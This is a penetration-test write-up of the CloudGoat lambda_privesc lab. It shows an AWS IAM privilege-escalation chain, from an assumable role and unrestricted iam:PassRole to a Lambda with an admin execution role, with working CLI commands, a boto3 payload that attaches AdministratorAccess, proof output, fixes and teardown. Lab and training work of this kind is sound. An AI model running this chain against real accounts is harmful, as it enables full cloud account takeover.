# AWS IAM Lambda Privilege Escalation — Penetration Test Report

## Objective and Scope

The objective of this assessment was to evaluate the security posture of a CloudGoat (`lambda_privesc`) AWS environment, simulating a realistic IAM privilege escalation attack chain. Starting from a low-privilege IAM user, the goal was to identify and abuse misconfigured IAM trust relationships, role-assumption permissions, and Lambda execution privileges to escalate to full administrative access on the account.

## Scope of Work

**In-Scope Assets:**
- **AWS Account:** 390346502168
- **Initial Access:** IAM user `chris` (provided as starting credentials)
- **Services:** AWS IAM, AWS Lambda, AWS STS
- **Testing Perspective:** Low-privilege IAM user with no prior knowledge of the environment

---

## Enumeration

### Initial Identity Verification

```bash
aws sts get-caller-identity --profile cloudgoat_lambda_privesc
```
```json
{
    "UserId": "AIDAVVYTW6AMMAY6ROA3P",
    "Account": "390346502168",
    "Arn": "arn:aws:iam::390346502168:user/chris-cgid0gkqfiyl7u"
}
```

The `chris` user was confirmed as the starting point. IAM self-enumeration was performed as the first reconnaissance step, since the user's policy granted broad `iam:List*` and `iam:Get*` permissions.

### IAM Self-Enumeration

No groups or inline policies were attached to the user:

```bash
aws iam list-groups-for-user --user-name chris-cgid0gkqfiyl7u --profile cloudgoat_lambda_privesc
# "Groups": []

aws iam list-user-policies --user-name chris-cgid0gkqfiyl7u --profile cloudgoat_lambda_privesc
# "PolicyNames": []
```

A single managed policy was attached: `cg-chris-policy-cgid0gkqfiyl7u`, granting:

```json
{
    "Action": ["sts:AssumeRole", "iam:List*", "iam:Get*"],
    "Effect": "Allow",
    "Resource": "*",
    "Sid": "chris"
}
```

This confirmed `chris` could enumerate all IAM entities and assume **any** role in the account, with no resource restriction.

### Role Discovery

Using `iam:List*`, all IAM roles in the account were enumerated via `aws iam list-roles`. Alongside default AWS service-linked roles, two custom roles stood out:

| Role | Trust Principal | Notes |
|---|---|---|
| `cg-debug-role-cgid0gkqfiyl7u` | `lambda.amazonaws.com` | Cannot be assumed directly by an IAM user — only by the Lambda service |
| `cg-lambdaManager-role-cgid0gkqfiyl7u` | `arn:aws:iam::390346502168:user/chris-cgid0gkqfiyl7u` | Directly assumable by `chris` |

`cg-lambdaManager-role` was the immediate pivot point, as its trust policy explicitly allowed the `chris` user to assume it.

### Tools Used
- AWS CLI
- `aws sts`, `aws iam`, `aws lambda`
- Python / `boto3` (custom Lambda payload)

---

## Vulnerabilities

| Vulnerability | Severity | Impact |
|---|---|---|
| Overly Permissive `sts:AssumeRole` Granted to Low-Privilege User | Critical | Enables lateral movement into a privileged Lambda management role |
| Excessive IAM Permissions on Lambda Manager Role (`lambda:*` + `iam:PassRole`) | Critical | Enables creation of arbitrary Lambda functions with an administrator-trusted execution role |
| Privilege Escalation via Lambda Execution Role with `AdministratorAccess` | Critical | Full account takeover from a low-privilege starting user |

---

### Overly Permissive `sts:AssumeRole` Granted to Low-Privilege User

#### Severity
Critical

#### CWE
CWE-269: Improper Privilege Management

#### OWASP Category
OWASP Top 10 2021 – A01: Broken Access Control

#### Description
The `chris` IAM user's only attached policy granted `sts:AssumeRole` on `Resource: "*"`, with no condition or resource constraint limiting which roles could be assumed. Combined with `iam:List*`/`iam:Get*`, this allowed `chris` to enumerate every role in the account and identify which ones explicitly trusted it — without needing any other principal's cooperation.

#### Affected Functionality
- IAM user: `chris-cgid0gkqfiyl7u`
- IAM policy: `cg-chris-policy-cgid0gkqfiyl7u`

#### Steps to Reproduce
1. Confirm the attached policy and its permissions:
   ```bash
   aws iam list-attached-user-policies --user-name chris-cgid0gkqfiyl7u --profile cloudgoat_lambda_privesc
   aws iam get-policy-version --policy-arn arn:aws:iam::390346502168:policy/cg-chris-policy-cgid0gkqfiyl7u --version-id v1 --profile cloudgoat_lambda_privesc
   ```
2. Enumerate all roles in the account:
   ```bash
   aws iam list-roles --profile cloudgoat_lambda_privesc
   ```
3. Identify roles whose trust policy names `chris` as a trusted principal — in this case, `cg-lambdaManager-role-cgid0gkqfiyl7u`.
4. Assume the role:
   ```bash
   aws sts assume-role \
     --role-arn arn:aws:iam::390346502168:role/cg-lambdaManager-role-cgid0gkqfiyl7u \
     --role-session-name MySession \
     --profile cloudgoat_lambda_privesc
   ```

#### Proof of Concept
The `assume-role` call succeeded without restriction and returned valid temporary credentials:
```json
{
    "Credentials": {
        "AccessKeyId": "ASIAVVYTW6AMGG6NTNEJ",
        "SecretAccessKey": "gaB2a6ji...5F7G6S42aOcX8qkYpMz",
        "SessionToken": "<session-token>",
        "Expiration": "2026-06-07T13:46:02+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAVVYTW6AMDIQH5XCTE:MySession",
        "Arn": "arn:aws:sts::390346502168:assumed-role/cg-lambdaManager-role-cgid0gkqfiyl7u/MySession"
    }
}
```
This was confirmed via `aws sts get-caller-identity`, showing the session was now operating as `cg-lambdaManager-role`.

#### Impact
- Allows a low-privilege user to pivot into any role that trusts it, without further exploitation
- In this case, directly enables lateral movement into a role with near-administrative Lambda and `PassRole` permissions (see next finding)

#### Root Cause
The `chris` user's policy granted `sts:AssumeRole` with a wildcard resource instead of scoping it to specific role ARNs the user legitimately needed to assume. Wildcard `AssumeRole` permissions effectively flatten any IAM trust boundary the role's own trust policy was meant to enforce, since the calling principal can discover and assume any role that trusts it.

#### Recommendation
- Scope `sts:AssumeRole` to explicit role ARNs required for the user's job function — never use `Resource: "*"`
- Treat `iam:List*`/`iam:Get*` combined with broad `AssumeRole` as a high-risk permission pairing, since it allows full discovery and pivoting in one step
- Regularly audit IAM trust policies to ensure roles only trust the minimum set of principals necessary
- Use IAM Access Analyzer to flag roles with overly permissive trust relationships

#### References
- OWASP Top 10 2021 – A01: Broken Access Control
- CWE-269
- [AWS IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html)

---

### Excessive IAM Permissions on Lambda Manager Role (`lambda:*` + `iam:PassRole`)

#### Severity
Critical

#### CWE
CWE-269: Improper Privilege Management

#### OWASP Category
OWASP Top 10 2021 – A01: Broken Access Control

#### Description
The assumed `cg-lambdaManager-role` carried the policy `cg-lambdaManager-policy-cgid0gkqfiyl7u`, granting unrestricted `lambda:*` actions and `iam:PassRole`, both scoped to `Resource: "*"`:

```json
{
    "Action": ["lambda:*", "iam:PassRole"],
    "Effect": "Allow",
    "Resource": "*",
    "Sid": "lambdaManager"
}
```

An unrestricted `iam:PassRole` paired with `lambda:*` is a well-known IAM privilege escalation primitive: it allows the holder to create a Lambda function and attach **any** IAM role in the account as its execution role — including roles with administrative trust relationships — then run arbitrary code under that role's identity.

#### Affected Functionality
- IAM role: `cg-lambdaManager-role-cgid0gkqfiyl7u`
- IAM policy: `cg-lambdaManager-policy-cgid0gkqfiyl7u`
- Target execution role: `cg-debug-role-cgid0gkqfiyl7u` (trusts `lambda.amazonaws.com`, holds `AdministratorAccess`)

#### Steps to Reproduce
1. While assumed as `cg-lambdaManager-role`, enumerate other roles in the account and their attached policies, in particular `cg-debug-role-cgid0gkqfiyl7u`:
   ```bash
   aws iam list-attached-role-policies --role-name cg-debug-role-cgid0gkqfiyl7u --profile cloudgoat_lambda_privesc
   ```
   This returned `AdministratorAccess` as an attached managed policy.
2. Confirm `cg-debug-role` trusts the Lambda service (`lambda.amazonaws.com`) in its assume-role policy, meaning any Lambda function can be configured to execute as this role.
3. With `lambda:*` and `iam:PassRole` available, proceed to the privilege escalation step in the next finding.

#### Impact
- Grants the ability to pass any IAM role — including administrative ones — to a newly created Lambda function
- Combined with the debug role's `AdministratorAccess` policy, this is the direct enabler of full account compromise

#### Root Cause
The Lambda manager role was granted blanket `lambda:*` and unrestricted `iam:PassRole` instead of being scoped to specific, non-privileged execution roles. `iam:PassRole` without a resource or condition constraint is one of the most common AWS privilege escalation vectors, since it lets a principal grant other services access to any role in the account.

#### Recommendation
- Scope `iam:PassRole` to an explicit list of approved execution role ARNs using the `Resource` element — never grant it as `Resource: "*"`
- Use the `iam:PassedToService` condition key to restrict which AWS service the role may be passed to
- Apply least-privilege Lambda actions (`lambda:CreateFunction`, `lambda:InvokeFunction`, etc.) instead of `lambda:*`
- Periodically run AWS IAM Access Analyzer or similar tooling to detect `PassRole`-based privilege escalation paths

#### References
- OWASP Top 10 2021 – A01: Broken Access Control
- CWE-269
- [iam:PassRole privilege escalation primitive — AWS re:Post](https://repost.aws/knowledge-center/iam-passrole-best-practices)

---

### Privilege Escalation via Lambda Execution Role with AdministratorAccess

#### Severity
Critical

#### CWE
CWE-269: Improper Privilege Management

#### OWASP Category
OWASP Top 10 2021 – A01: Broken Access Control

#### Description
`cg-debug-role-cgid0gkqfiyl7u` trusted the Lambda service and had the AWS-managed `AdministratorAccess` policy attached (`Effect: Allow`, `Action: "*"`, `Resource: "*"`). Because the `cg-lambdaManager-role` session held `lambda:CreateFunction`, `lambda:InvokeFunction`, and unrestricted `iam:PassRole`, a malicious Lambda function could be created with `cg-debug-role` as its execution role and invoked to run arbitrary `boto3` code with full administrative privileges — including attaching `AdministratorAccess` directly to the original low-privilege user, `chris`.

#### Affected Functionality
- IAM role: `cg-debug-role-cgid0gkqfiyl7u` (`AdministratorAccess`)
- Lambda function: `admin_function`
- IAM user: `chris-cgid0gkqfiyl7u`

#### Steps to Reproduce
1. Write a Lambda function payload that attaches `AdministratorAccess` to the `chris` user:
   ```python
   import boto3

   def lambda_handler(event, context):
       username = 'chris-cgid0gkqfiyl7u'
       admin_policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'
       iam = boto3.client('iam')
       try:
           response = iam.attach_user_policy(
               UserName=username,
               PolicyArn=admin_policy_arn
           )
           return f'Successfully attached AdministratorAccess to {username}'
       except Exception as e:
           return f'Error occurred {str(e)}'
   ```
2. Package the function and create it, passing the privileged `cg-debug-role` as the execution role:
   ```bash
   aws lambda create-function \
     --function-name admin_function \
     --runtime python3.14 \
     --role arn:aws:iam::390346502168:role/cg-debug-role-cgid0gkqfiyl7u \
     --handler lambda_function.lambda_handler \
     --zip fileb://function.zip \
     --profile cloudgoat_lambda_privesc_role \
     --region us-east-1
   ```
3. Invoke the function:
   ```bash
   aws lambda invoke --function-name admin_function output.json \
     --profile cloudgoat_lambda_privesc_role --region us-east-1
   ```

#### Proof of Concept
```bash
$ aws lambda invoke --function-name admin_function output.json --profile cloudgoat_lambda_privesc_role --region us-east-1
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}

$ cat output.json
"Successfully attached AdministratorAccess to {username}"

$ aws iam list-attached-user-policies --user-name chris-cgid0gkqfiyl7u --profile cloudgoat_lambda_privesc
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-chris-policy-cgid0gkqfiyl7u",
            "PolicyArn": "arn:aws:iam::390346502168:policy/cg-chris-policy-cgid0gkqfiyl7u"
        },
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```
The original low-privilege user `chris` now holds full `AdministratorAccess` on the account, confirming complete privilege escalation.

#### Impact
- Full administrative compromise of the AWS account, starting from a single low-privilege IAM user with no prior access
- In a real environment, this grants the attacker complete control: data exfiltration, resource destruction, persistence creation, billing abuse, and disabling of security controls (CloudTrail, GuardDuty, Config, etc.)

#### Root Cause
A chain of three individually-plausible misconfigurations compounded into full compromise: (1) unrestricted `sts:AssumeRole` on the initial user, (2) unrestricted `iam:PassRole` + `lambda:*` on the assumed role, and (3) an `AdministratorAccess`-attached role trusting the Lambda service with no further restriction on who could pass it. Removing any single link would have broken the chain.

#### Recommendation
- Never attach `AdministratorAccess` to a role intended for automated/service execution (e.g., Lambda); scope execution roles to only the permissions the function's code requires
- Enforce `iam:PassRole` resource scoping (see previous finding) so that even a compromised Lambda-manager identity cannot pass an administrative role
- Apply Service Control Policies (SCPs) at the AWS Organizations level to prevent any role from being attached `AdministratorAccess` outside of a tightly controlled break-glass process
- Enable CloudTrail alerting on `AttachUserPolicy`, `AttachRolePolicy`, and `CreateFunction` calls involving administrative policies, and alert on privilege changes for IAM users
- Periodically run automated privilege-escalation path analysis (e.g., Pacu's `iam__privesc_scan`, PMapper, or IAM Access Analyzer) against the account

#### References
- OWASP Top 10 2021 – A01: Broken Access Control
- CWE-269
- [AWS IAM Privilege Escalation Methods (Rhino Security Labs)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

---

## Attack Chain Summary

1. Started with low-privilege IAM user `chris` (provided as initial access)
2. Enumerated `chris`'s own IAM policy — discovered unrestricted `sts:AssumeRole`, `iam:List*`, and `iam:Get*` permissions
3. Enumerated all IAM roles in the account and identified `cg-lambdaManager-role`, whose trust policy explicitly allowed `chris` to assume it
4. Assumed `cg-lambdaManager-role`, gaining `lambda:*` and unrestricted `iam:PassRole`
5. Enumerated other roles and discovered `cg-debug-role`, which trusted the Lambda service and held `AdministratorAccess`
6. Created a malicious Lambda function (`admin_function`) using `cg-debug-role` as its execution role
7. Invoked the function, which used its inherited `AdministratorAccess` to attach the `AdministratorAccess` managed policy directly to `chris`
8. Confirmed full administrative privilege escalation on the original low-privilege user

## Key Takeaways

- Wildcard `sts:AssumeRole` on a low-privilege user collapses the IAM trust boundary — it allows full discovery and pivoting into any role that trusts that user, with no further exploitation required
- `iam:PassRole` without resource scoping is one of the most common and dangerous AWS privilege escalation primitives, especially when paired with broad service permissions like `lambda:*`
- Never attach `AdministratorAccess` (or any broad managed policy) to a role intended for service execution (Lambda, EC2, etc.) — execution roles should be scoped to exactly what the function's code needs
- Each individual misconfiguration in this chain (broad `AssumeRole`, broad `PassRole`, an over-privileged debug role) might be rated only "Medium" in isolation, but together they form a complete, low-effort path from zero access to full account compromise
- Privilege escalation path analysis (Pacu `iam__privesc_scan`, PMapper, IAM Access Analyzer) should be run regularly against production accounts to catch these chains before an attacker does

---

## Cleanup / Teardown

To avoid ongoing AWS charges and to leave the environment in a clean state after testing:

1. **Delete the malicious Lambda function** created during exploitation:
   - Via console or CLI:
     ```bash
     aws lambda delete-function --function-name admin_function --profile cloudgoat_lambda_privesc_role --region us-east-1
     ```
2. **Revert the privilege escalation** (if not handled automatically by lab teardown):
   - Detach `AdministratorAccess` from `chris-cgid0gkqfiyl7u`:
     ```bash
     aws iam detach-user-policy \
       --user-name chris-cgid0gkqfiyl7u \
       --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
       --profile cloudgoat_lambda_privesc
     ```
3. **Destroy the CloudGoat scenario** to tear down all provisioned infrastructure and avoid continued billing:
   ```bash
   cloudgoat destroy lambda_privesc
   ```
4. Confirm in the AWS Console (IAM, Lambda) that no residual roles, policies, or functions from the scenario remain.